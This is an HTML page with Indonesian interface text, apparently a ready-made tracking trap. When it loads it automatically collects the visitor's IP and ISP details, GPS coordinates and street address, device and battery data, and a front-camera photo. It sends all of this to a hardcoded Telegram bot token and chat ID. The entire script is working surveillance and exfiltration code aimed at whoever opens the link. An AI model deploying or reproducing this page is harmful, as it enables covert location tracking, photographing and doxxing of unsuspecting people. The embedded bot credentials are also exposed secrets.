<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Auto Capture & Telegram (Rapi)</title>
  <style>
    body { background:#000; color:#7CFC00; font-family:monospace; padding:18px; }
    h1{ font-size:18px; margin:0 0 8px 0; }
    #status{ margin:10px 0 14px 0; white-space:pre-wrap; }
    video, canvas { display:none; }
    pre{ border:1px dashed #7CFC00; padding:10px; border-radius:6px; max-width:900px; white-space:pre-wrap;}
    a{ color:#7CFC00; }
    small{ color:#9f9; }
    button{ background:#7CFC00; color:#000; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
  </style>
</head>
<body>
  <h1>üîê Auto Report ‚Üí Foto ‚Üí Telegram (Format Rapi)</h1>
  <div id="status">Menunggu... (halaman akan otomatis berjalan)</div>
  <pre id="output"></pre>

  <video id="video" autoplay playsinline width="300" height="300"></video>
  <canvas id="canvas" width="300" height="300"></canvas>

<script>
/* ---------- CONFIG (SUDAH DIISI) ---------- */
const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";
/* ------------------------------------------ */

const statusEl = document.getElementById('status');
const out = document.getElementById('output');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

function log(msg){
  statusEl.textContent = msg;
  out.textContent = (out.textContent ? out.textContent + "\n\n" : "") + msg;
}

// ----- IP details with fallbacks -----
async function getIPDetails(){
  const sources = [
    { url: 'https://ipapi.co/json/', mapper: j => ({
        ip: j.ip, city: j.city, region: j.region, country: j.country_name || j.country,
        org: j.org || j.orgname || j.company, postal: j.postal || j.postal_code, timezone: j.timezone
      }) },
    { url: 'https://ipwhois.app/json/', mapper: j => ({
        ip: j.ip, city: j.city, region: j.region, country: j.country, org: j.org || j.isp,
        postal: j.postal, timezone: j.timezone
      }) },
    { url: 'https://api.ipify.org?format=json', mapper: j => ({ ip: j.ip }) }
  ];

  for (const s of sources){
    try {
      const resp = await fetch(s.url, {cache: 'no-store'});
      if (!resp.ok) throw new Error('bad resp ' + resp.status);
      const json = await resp.json();
      const mapped = s.mapper(json);
      if (!mapped.ip) throw new Error('no ip');
      return mapped;
    } catch (e) {
      console.warn('IP source failed', s.url, e);
    }
  }
  return { ip: 'unknown' };
}

// ----- Geolocation (GPS) -----
function getGeo(){
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve({ error: 'geolocation not supported' });
    navigator.geolocation.getCurrentPosition(
      p => resolve({
        lat: p.coords.latitude,
        lon: p.coords.longitude,
        acc: p.coords.accuracy + ' m',
        maps: `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`
      }),
      err => resolve({ error: err.message })
    );
  });
}

// ----- Reverse geocoding (Nominatim) -----
async function revGeocode(lat, lon){
  try {
    const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {cache:'no-store', headers:{'User-Agent':'AutoReport/1.0'}});
    if (!resp.ok) throw new Error('revgeo fail ' + resp.status);
    const j = await resp.json();
    // prefer display_name; also extract address fields if present
    return {
      display_name: j.display_name || null,
      address: j.address || null
    };
  } catch (e){
    console.warn('Reverse geocode failed', e);
    return { error: e.message || 'reverse geocode failed' };
  }
}

// ----- Battery -----
async function getBattery(){
  try {
    if (!navigator.getBattery) return null;
    const b = await navigator.getBattery();
    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
  } catch { return null; }
}

// ----- Connection info (if supported) -----
function getConnection(){
  try {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return null;
    return {
      effectiveType: c.effectiveType,
      downlink: c.downlink,
      rtt: c.rtt,
      saveData: c.saveData
    };
  } catch { return null; }
}

// ----- Telegram helpers -----
async function tgSendText(text){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  return fetch(url, {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });
}
async function tgSendPhoto(photoBlob, caption){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', photoBlob, 'camera.png');
  if (caption) fd.append('caption', caption);
  return fetch(url, { method: 'POST', body: fd });
}

// ----- Utility: format boxed message like contoh -----
function buildBoxedMessage(fields){
  // fields: array of {label, value} or sections as {title, lines:[]}
  // We'll produce a neat box using ‚ï≠ ‚îú ‚îî style
  const lines = [];
  const now = new Date();
  lines.push(`‚ï≠‚îÄ > Tanggal: ${now.toLocaleString()}`);
  // iterate fields, printing structured sections
  for (const s of fields){
    if (s.title && Array.isArray(s.lines)){
      // print title as a section header
      lines.push(` ‚îú‚îÄ > ${s.title}`);
      // each line under it prefixed with ‚îÇ   or similar
      for (let i=0;i<s.lines.length;i++){
        const prefix = (i===s.lines.length-1) ? ' ‚îÇ   ‚îî‚îÄ ' : ' ‚îÇ   ‚îú‚îÄ ';
        lines.push(prefix + s.lines[i]);
      }
    } else if (s.label) {
      // single kv
      lines.push(` ‚îú‚îÄ > ${s.label}: ${s.value !== undefined ? s.value : ''}`);
    }
  }
  lines.push(`‚ï∞‚îÄ > Sumber: AutoReport Web`);
  return lines.join('\n');
}

// ----- Main run -----
async function runAll(){
  log('Mulai pengumpulan data...');

  // quick device info
  const device = {
    platform: navigator.platform || 'unknown',
    userAgent: navigator.userAgent || 'unknown',
    screen: `${screen.width || '?'}x${screen.height || '?'}`,
    language: navigator.language || 'unknown',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    date: new Date().toLocaleString(),
    cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
    online: navigator.onLine ? 'online' : 'offline',
    hwConcurrency: navigator.hardwareConcurrency || '?',
    doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || 'unknown',
    connection: getConnection()
  };

  // parallel fetches
  const [ ipDet, battery, geo ] = await Promise.all([ getIPDetails(), getBattery(), getGeo() ]);
  device.battery = battery || '?';

  // reverse geocode if GPS available
  let rev = null;
  if (!geo.error && geo.lat && geo.lon){
    rev = await revGeocode(geo.lat, geo.lon);
  }

  log('IP terkumpul: ' + (ipDet.ip || 'unknown'));
  log('Menangkap kamera (minta izin)...');

  // capture camera
  let photoBlob = null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    video.srcObject = stream;
    await video.play();
    await new Promise(r => setTimeout(r, 1200)); // biarkan frame ready
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    stream.getTracks().forEach(t => t.stop());
    log('Foto berhasil diambil.');
    // toBlob wrapper with Promise
    photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png', 0.95));
  } catch (e){
    console.warn('kamera error', e);
    log('‚ùå Kamera error: ' + (e.message || e));
  }

  // build structured fields for box
  const fields = [
    { title: 'Pesan', lines: [ 'Auto capture & device report' ] },
    { title: 'Pengirim (web)', lines: [ device.userAgent ] },
    { title: 'IP / ISP', lines: [
      `IP: ${ipDet.ip || '?'}`,
      `ISP/Org: ${ipDet.org || '?'}`,
      `City: ${ipDet.city || '?'}`,
      `Region: ${ipDet.region || '?'}`,
      `Country: ${ipDet.country || '?'}`,
      `Postal: ${ipDet.postal || '?'}`,
      `IP Timezone: ${ipDet.timezone || '?'}`
    ] },
    { title: 'Device', lines: [
      `Platform: ${device.platform}`,
      `Screen: ${device.screen}`,
      `Language: ${device.language}`,
      `Timezone (browser): ${device.timezone}`,
      `Local Date: ${device.date}`,
      `Battery: ${device.battery}`,
      `Cookies Enabled: ${device.cookiesEnabled}`,
      `Online: ${device.online}`,
      `HW Threads: ${device.hwConcurrency}`,
      `DoNotTrack: ${device.doNotTrack}`
    ] },
    { title: 'Connection', lines: [
      device.connection ? `Type: ${device.connection.effectiveType || '?'} | Downlink: ${device.connection.downlink || '?'} Mbps | RTT: ${device.connection.rtt || '?'} ms` : 'Connection API: tidak tersedia'
    ] },
    { title: 'Geo (GPS)', lines: [
      geo.error ? `Error: ${geo.error}` : `Lat: ${geo.lat}, Lon: ${geo.lon}`,
      geo.error ? '' : `Akurasi: ${geo.acc}`,
      geo.error ? '' : `Maps: ${geo.maps}`
    ].filter(Boolean) },
  ];

  if (rev){
    if (rev.error) {
      fields.push({ title: 'Reverse Geocode', lines: [ `Error: ${rev.error}` ] });
    } else {
      fields.push({ title: 'Alamat (Reverse Geocode)', lines: [ rev.display_name || 'N/A', JSON.stringify(rev.address || {}, null, 0) ] });
    }
  }

  // create boxed text
  const boxed = buildBoxedMessage(fields);

  // show to UI
  log('Mempersiapkan pesan untuk Telegram:\n' + boxed);

  // send to telegram: text then photo (if any)
  try {
    log('Mengirim teks ke Telegram...');
    await tgSendText(boxed);
    log('Teks terkirim.');
    if (photoBlob){
      log('Mengirim foto ke Telegram...');
      await tgSendPhoto(photoBlob, 'üì∑ Foto (otomatis dari camera)');
      log('Foto terkirim.');
    } else {
      log('Tanpa foto (kamera error / ditolak).');
    }
    log('‚úÖ Selesai: data & (jika ada) foto terkirim ke Telegram.');
  } catch (e){
    console.error('Tg send failed', e);
    log('‚ùå Gagal mengirim ke Telegram: ' + (e.message || e));
  }
}

// auto-run after short delay; check token/chat
setTimeout(() => {
  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')){
    log('‚ö†Ô∏è Silakan periksa BOT_TOKEN & CHAT_ID di kode.');
    return;
  }
  runAll();
}, 600);

</script>
</body>
</html>
